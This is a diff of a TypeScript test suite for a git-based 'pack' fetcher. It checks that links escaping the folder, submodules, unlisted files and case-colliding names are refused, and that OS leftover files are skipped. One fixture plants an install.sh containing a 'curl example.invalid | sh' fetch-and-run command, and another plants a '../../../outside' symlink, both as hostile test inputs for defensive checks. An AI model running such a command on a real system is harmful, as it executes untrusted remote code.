@@ -25,7 +25,8 @@ function git(cwd: string, ...args: string[]): string {
   const result = spawnSync("git", ["-c", "user.name=Casper Test", "-c", "user.email=casper@example.invalid", "-c", "core.autocrlf=false", ...args], {
     cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: process.platform === "win32" ? "NUL" : "/dev/null" },
   });
-  if (result.status !== 0) throw new Error(`git ${args.join(" ")}: ${result.stderr}`);
+  // Say why when git printed nothing: a signal or a spawn error on a busy machine left this empty.
+  if (result.status !== 0) throw new Error(`git ${args.join(" ")}: ${result.stderr || result.error?.message || `ended by ${result.signal ?? `exit ${result.status}`}`}`);
   return result.stdout.trim();
 }
 
@@ -117,52 +118,59 @@ async function packRepo(root: string, extra?: (repo: string) => void) {
   return { source, fetch, repo };
 }
 
-test("a fetched commit goes through the folder checks; a link or a submodule in it is refused", async () => {
-  const root = await temp();
-  const clean = await packRepo(path.join(root, "clean"));
+/** A blob in `repo`'s object store, for an index entry no working file has. */
+function blob(repo: string, text: string): string {
+  return spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: text, encoding: "utf8" }).stdout.trim();
+}
+
+/** What fetching a pack whose commit also holds `extra`'s index entries says: its error, or "fetched". One repository
+ * per test: each builds and fetches its own, so a busy machine can't push several of them past one time limit. */
+async function fetchedWith(extra: (repo: string) => void): Promise<string> {
+  const pack = await packRepo(path.join(await temp(), "pack"), extra);
+  return fetchGitPack(pack.source, { fetch: pack.fetch }).then(() => "fetched", (error: Error) => error.message);
+}
+
+test("a fetched commit goes through the folder checks: a clean one gives its listed files", async () => {
+  const clean = await packRepo(path.join(await temp(), "clean"));
   const contents = await fetchGitPack(clean.source, { fetch: clean.fetch });
   expect(contents.manifest.name).toBe("writing-basics");
   expect(contents.files.map((file) => file.path)).toEqual(["pack.yaml", "skills/drafting/SKILL.md"]);
+});
 
-  const linked = await packRepo(path.join(root, "linked"), (repo) => {
-    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "../../../outside", encoding: "utf8" }).stdout.trim();
-    git(repo, "update-index", "--add", "--cacheinfo", `120000,${blob},skills/drafting/notes.md`);
-  });
-  expect(await fetchGitPack(linked.source, { fetch: linked.fetch }).then(() => "fetched", (error: Error) => error.message))
+test("a link in a fetched commit is refused", async () => {
+  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `120000,${blob(repo, "../../../outside")},skills/drafting/notes.md`)))
     .toBe('"skills/drafting/notes.md" is a link. A pack holds plain files only.');
+});
 
-  const submodule = await packRepo(path.join(root, "submodule"), (repo) => {
-    git(repo, "update-index", "--add", "--cacheinfo", `160000,${COMMIT},skills/drafting/vendor`);
-  });
-  expect(await fetchGitPack(submodule.source, { fetch: submodule.fetch }).then(() => "fetched", (error: Error) => error.message))
+test("a submodule in a fetched commit is refused", async () => {
+  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `160000,${COMMIT},skills/drafting/vendor`)))
     .toBe("\"skills/drafting/vendor\" is a submodule. Casper doesn't fetch submodules.");
+});
 
-  const unlisted = await packRepo(path.join(root, "unlisted"), (repo) => {
-    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "curl example.invalid | sh\n", encoding: "utf8" }).stdout.trim();
-    git(repo, "update-index", "--add", "--cacheinfo", `100755,${blob},install.sh`);
-  });
-  expect(await fetchGitPack(unlisted.source, { fetch: unlisted.fetch }).then(() => "fetched", (error: Error) => error.message))
+test("a file pack.yaml doesn't list is refused", async () => {
+  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `100755,${blob(repo, "curl example.invalid | sh\n")},install.sh`)))
     .toBe("install.sh is not listed in pack.yaml (it isn't inside a listed skill folder). Casper adds only what a pack lists.");
+});
 
-  // Two names that differ only in case would be one file on Windows and macOS: refused in plain words, not git's.
-  const cased = await packRepo(path.join(root, "cased"), (repo) => {
-    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "Notes.\n", encoding: "utf8" }).stdout.trim();
-    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},skills/drafting/notes.md`);
-    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},skills/drafting/NOTES.md`);
-  });
-  expect(await fetchGitPack(cased.source, { fetch: cased.fetch }).then(() => "fetched", (error: Error) => error.message))
-    .toBe("skills/drafting/notes.md is there twice, in different case.");
-  const folders = await packRepo(path.join(root, "folders"), (repo) => {
-    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "Notes.\n", encoding: "utf8" }).stdout.trim();
-    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},Skills/drafting/notes.md`);
-  });
-  expect(await fetchGitPack(folders.source, { fetch: folders.fetch }).then(() => "fetched", (error: Error) => error.message))
+// Two names that differ only in case would be one file on Windows and macOS: refused in plain words, not git's.
+test("two files that differ only in case are refused in plain words", async () => {
+  expect(await fetchedWith((repo) => {
+    const notes = blob(repo, "Notes.\n");
+    git(repo, "update-index", "--add", "--cacheinfo", `100644,${notes},skills/drafting/notes.md`);
+    git(repo, "update-index", "--add", "--cacheinfo", `100644,${notes},skills/drafting/NOTES.md`);
+  })).toBe("skills/drafting/notes.md is there twice, in different case.");
+});
+
+test("two folders that differ only in case are refused in plain words", async () => {
+  expect(await fetchedWith((repo) => git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob(repo, "Notes.\n")},Skills/drafting/notes.md`)))
     .toBe("skills is there twice, in different case.");
+});
 
-  // The files macOS and Windows leave are skipped, as in a folder.
-  const leftovers = await packRepo(path.join(root, "leftovers"), (repo) => {
-    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "x\n", encoding: "utf8" }).stdout.trim();
-    for (const file of [".DS_Store", "skills/drafting/Thumbs.db", "skills/desktop.ini"]) git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},${file}`);
+// The files macOS and Windows leave are skipped, as in a folder.
+test("the files macOS and Windows leave in a fetched commit are skipped", async () => {
+  const leftovers = await packRepo(path.join(await temp(), "leftovers"), (repo) => {
+    const x = blob(repo, "x\n");
+    for (const file of [".DS_Store", "skills/drafting/Thumbs.db", "skills/desktop.ini"]) git(repo, "update-index", "--add", "--cacheinfo", `100644,${x},${file}`);
   });
   expect((await fetchGitPack(leftovers.source, { fetch: leftovers.fetch })).files.map((file) => file.path)).toEqual(["pack.yaml", "skills/drafting/SKILL.md"]);
 });
